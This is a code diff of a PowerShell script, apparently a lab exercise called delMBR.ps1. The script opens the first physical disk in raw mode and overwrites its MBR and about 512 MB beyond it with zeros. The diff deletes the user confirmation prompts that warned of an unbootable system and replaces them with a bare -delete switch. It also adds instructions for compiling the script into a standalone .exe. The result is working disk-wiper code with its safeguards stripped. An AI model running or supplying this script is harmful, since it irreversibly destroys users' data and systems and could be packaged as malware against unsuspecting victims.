@@ -1,10 +1,14 @@
 
 
-#fjern fra lab script
-read-host "Er du sikker på at du vil slette MBR? Dette kan gjøre systemet ustartbart! Trykk Enter for å fortsette eller Ctrl+C for å avbryte."
-read-host "Trykk Enter for å bekrefte."
-read-host "Er du helt sikker? Dette kan ikke angres!"
-#fjern fra lab script
+# get option -delete: example usage: .\delMBR.ps1 -delete -> exe (ps2exe -inputFile delMBR.ps1 -outputFile delMBR.exe) -> example usage: .\delMBR.exe -delete
+param(
+    [switch]$delete
+)
+
+if (-not $delete) {
+    throw "Du må spesifisere -delete for å slette MBR."
+    exit 1
+}
 
 $code = @"
 using System;
@@ -26,25 +30,21 @@ public class RawDisk {
 "@
 Add-Type -TypeDefinition $code
 
-# 2. Konstanter som gyldig UInt32 (fikser feilmeldingen)
 [uint32]$GENERIC_RW = "0xC0000000"
 [uint32]$FILE_SHARE_RW = 3
 [uint32]$OPEN_EXISTING = 3
 
 $diskPath = "\\.\PhysicalDrive0"
 
-# 3. Åpne SafeFileHandle mot rå disk
 $handle = [RawDisk]::CreateFile($diskPath, $GENERIC_RW, $FILE_SHARE_RW, [IntPtr]::Zero, $OPEN_EXISTING, 0, [IntPtr]::Zero)
 
 if ($null -eq $handle -or $handle.IsInvalid) {
     throw "Kunne ikke åpne disken. Husk å kjøre PowerShell som Administrator."
 }
 
-# 4. Koble handle til FileStream og les 1 sektor (512 bytes)
 try {
     $fs = New-Object System.IO.FileStream($handle, [System.IO.FileAccess]::ReadWrite)
     
-    # 5. Skriv nuller til disken, i biter (unngår å allokere én kjempestor buffer)
     $fs.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
     $chunkSize  = 512
     $totalBytes = [int64]512 * 1000000
